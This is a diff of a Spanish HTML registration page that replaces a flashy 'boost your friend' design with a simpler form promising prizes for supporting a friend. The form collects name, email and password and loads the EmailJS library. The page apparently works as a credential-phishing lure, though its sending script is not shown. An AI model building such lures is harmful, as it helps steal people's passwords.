@@ -8,51 +8,35 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div id="particles-js"></div>
+    <div class="fondo-dinamico"></div>
     
     <main class="contenedor">
         <div class="tarjeta">
             <div class="cabecera">
-                <h1 class="titulo-animado">¡Impulsa a tu Amigo!<span class="emoji">🚀</span></h1>
-                <p class="subtitulo">Registro seguro en 30 segundos</p>
+                <div class="icono">🎯</div>
+                <h1>Regístrate para apoyar a tu amigo</h1>
+                <p class="subtitulo">Ayúdale a ganar increíbles premios</p>
             </div>
 
-            <form id="formRegistro" class="formulario-vip">
+            <form id="formRegistro">
                 <div class="grupo-input">
-                    <div class="input-container">
-                        <input type="text" id="nombre" required>
-                        <label>Nombre completo</label>
-                        <div class="linea-focus"></div>
-                    </div>
+                    <input type="text" placeholder="Nombre completo" required>
+                </div>
+                
+                <div class="grupo-input">
+                    <input type="email" placeholder="correo@ejemplo.com" required>
+                </div>
+                
+                <div class="grupo-input">
+                    <input type="password" placeholder="Contraseña segura" required>
                 </div>
 
-                <div class="grupo-input">
-                    <div class="input-container">
-                        <input type="email" id="correo" required>
-                        <label>Correo profesional</label>
-                        <div class="linea-focus"></div>
-                    </div>
-                </div>
-
-                <div class="grupo-input">
-                    <div class="input-container">
-                        <input type="password" id="password" required>
-                        <label>Contraseña segura</label>
-                        <div class="linea-focus"></div>
-                    </div>
-                </div>
-
-                <button type="submit" class="boton-3d">
-                    <span>Validar Ahora</span>
-                    <div class="brillo"></div>
-                </button>
+                <button type="submit">Continuar →</button>
             </form>
         </div>
     </main>
 
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script src="script.js"></script>
-    <script src="particles.js"></script>
 </body>
 </html>
